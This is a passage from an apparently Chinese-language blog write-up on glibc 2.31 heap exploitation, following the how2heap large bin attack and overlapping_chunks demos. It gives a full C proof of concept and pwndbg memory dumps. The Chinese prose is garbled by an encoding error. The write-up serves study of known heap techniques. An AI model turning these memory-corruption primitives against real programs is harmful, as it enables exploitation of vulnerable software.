class="line">pwndbg&gt; x/<span class="number">20</span>gx &amp;target<span class="number">-2</span></span><br><span class="line"><span class="number">0x7fffffffe260</span>:<span class="number">0x00007fffffffe2c0</span><span class="number">0x0000555555555140</span></span><br><span class="line"><span class="number">0x7fffffffe270</span>:<span class="number">0x00007fffffffe3b0</span><span class="number">0x00005555555554a4</span></span><br><span class="line"><span class="number">0x7fffffffe280</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555555592a0</span></span><br><span class="line"><span class="number">0x7fffffffe290</span>:<span class="number">0x00005555555596d0</span><span class="number">0x00005555555596f0</span></span><br><span class="line"><span class="number">0x7fffffffe2a0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559b30</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å† malloc ä¸€ä¸ªæ¯” p2 å¤§ chunk ï¼ˆæ­¤æ—¶ p2 åœ¨ unsortedbin é‡Œï¼‰ï¼Œé‚£ä¹ˆæ­¤æ—¶ï¼Œå°±ä¼šå°† p2 ä» unsortedbin å–å‡ºï¼Œinsert  largebins é‡Œï¼Œé‚£ä¹ˆå°±å­˜åœ¨å¦‚ä¸‹ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code>   â€”- &gt; <code> p1-&gt;fd_nextsize = p2-&gt;fd</code></p><p><code>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize</code>   â€”â€”&gt; <code>p1-&gt;bk_nextsize = p2-&gt;fd-&gt;bk_next_size</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x5555555596e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span></span><br><span class="line"><span class="number">0x5555555596f0</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559700</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559710</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559720</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x7ffff7fb0be0</span> &lt;main_arena+<span class="number">96</span>&gt;:<span class="number">0x0000555555559f60</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7fb0bf0</span> &lt;main_arena+<span class="number">112</span>&gt;:<span class="number">0x00005555555596e0</span><span class="number">0x00005555555596e0</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æˆåŠŸåœ¨ target ç›®æ ‡å†™å…¥ p2-&gt;fd-&gt;bk_next_size çš„å€¼ï¼Œå³ 0x00005555555596e0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x target</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x5555555596e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>é€šå¸¸è€Œè¨€ï¼Œè¿™ç§å†™å¤§æ•°çš„è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¥ä¿®æ”¹ <em>global_max_fast</em></p><p>å®Œæ•´ä»£ç å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">fwd = bck;</span></span><br><span class="line"><span class="comment">bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-overlapping-chunks"><a href="#6-overlapping-chunks" class="headerlink" title="6. overlapping_chunks"></a>6. overlapping_chunks</h3><p>é€šè¿‡ä¿®æ”¹ size é€ æˆå †é‡å ï¼Œç„¶åæ‹¿åˆ°ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ª chunk</p><p>æ„é€ å¦‚ä¸‹ chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x80</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559310</span>      <span class="number">0x3131313131313131</span>  <span class="number">0x500</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559810</span>      <span class="number">0x3232323232323232</span>  <span class="number">0x80</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>p1 æ˜¯ å¤§å° 0x80 çš„chunkï¼Œ p2 æ˜¯å¤§å°ä¸º 0x500 çš„chunk ï¼Œp3 æ˜¯å¤§å°ä¸º 0x80 çš„chuk</p><p>ç„¶åä¿®æ”¹ p2 çš„å¤§å° ä¸º p2 +p 3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">44</span> <span class="comment">/* VULNERABILITY */</span></span><br><span class="line">â–º <span class="number">45</span> *(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line">  <span class="number">46</span> <span class="comment">/* VULNERABILITY */</span></span><br></pre></td></tr></table></figure><p>å†ç„¶åé‡Šæ”¾ p2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">48</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">â–º <span class="number">49</span> <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="number">50</span> <span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>å†åˆ†é…ä¸€ä¸ªæ–°çš„ å¤§å°ç¬¦åˆä¿®æ”¹ä¹‹åçš„  chunkï¼Œ å¯ä»¥æŠŠ ä¿®æ”¹å®Œ chunk ä¹‹åçš„ p2+p3 é‡æ–°åˆ†é…å›æ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">56</span> p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"> â–º <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">   <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">   <span class="number">60</span> <span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line">   <span class="number">61</span></span><br><span class="line">   <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">   <span class="number">63</span>    <span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp  0x7fffffffe280 â€”â–¸ 0x7fffffffe3b8 â€”â–¸ 0x7fffffffe633 â—‚â€” &#x27;/media/psf/Home/Downloads/how2heap/glibc_2.31/overlapping_chunks&#x27;</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe288</span> â—‚â€” <span class="number">0x15555556d</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe290</span> â€”â–¸ <span class="number">0x7ffff7fb5fc8</span> (__exit_funcs_lock) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe298</span> â—‚â€” <span class="number">0x57800000581</span></span><br><span class="line">04:0020â”‚      0x7fffffffe2a0 â€”â–¸ 0x5555555592a0 â—‚â€” 0x3131313131313131 (&#x27;11111111&#x27;)</span><br><span class="line">05:0028â”‚      0x7fffffffe2a8 â€”â–¸ 0x555555559320 â—‚â€” 0x3232323232323232 (&#x27;22222222&#x27;)</span><br><span class="line">06:0030â”‚      0x7fffffffe2b0 â€”â–¸ 0x555555559820 â—‚â€” 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">07:0038â”‚      0x7fffffffe2b8 â€”â–¸ 0x555555559320 â—‚â€” 0x3232323232323232 (&#x27;22222222&#x27;)</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">555555555390</span> main+<span class="number">359</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p p4+evil_region_size</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555bee0</span></span><br><span class="line">pwndbg&gt; p p3+<span class="number">0x580</span><span class="number">-8</span></span><br><span class="line">$<span class="number">10</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555c3e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±ä¼šå‘ç° p4 å’Œ p3 é‡å äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope p3</span><br><span class="line">00:0000â”‚ rax rdi  0x555555559820 â—‚â€” 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt; telescope p4</span><br><span class="line">00:0000â”‚   0x555555559320 â—‚â€” 0x3434343434343434 (&#x27;44444444&#x27;)</span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt; hexdump <span class="number">0x555555559320</span> <span class="number">0x400</span></span><br><span class="line">+<span class="number">0000</span> <span class="number">0x555555559320</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br><span class="line">+<span class="number">0020</span> <span class="number">0x555555559720</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚</span><br><span class="line">...</span><br><span class="line">+<span class="number">0120</span> <span class="number">0x555555559820</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  â”‚<span class="number">3333</span>â”‚<span class="number">3333</span>â”‚<span class="number">3333</span>â”‚<span class="number">3333</span>â”‚</span><br><span class="line">...</span><br><span class="line">+<span class="number">0170</span> <span class="number">0x555555559870</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚</span><br><span class="line">...</span><br><span class="line">+<span class="number">0190</span> <span class="number">0x555555559890</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">71</span> <span class="number">07</span> <span class="number">02</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  â”‚<span class="number">4444</span>â”‚<span class="number">4444</span>â”‚q...â”‚....â”‚</span><br><span class="line">+<span class="number">01</span>a0 <span class="number">0x5555555598a0</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="7-mmap-overlapping-chunks"><a href="#7-mmap-overlapping-chunks" class="headerlink" title="7. mmap_overlapping_chunks"></a>7. mmap_overlapping_chunks</h3><pre><code>    GLibCä¸­çš„Mmap 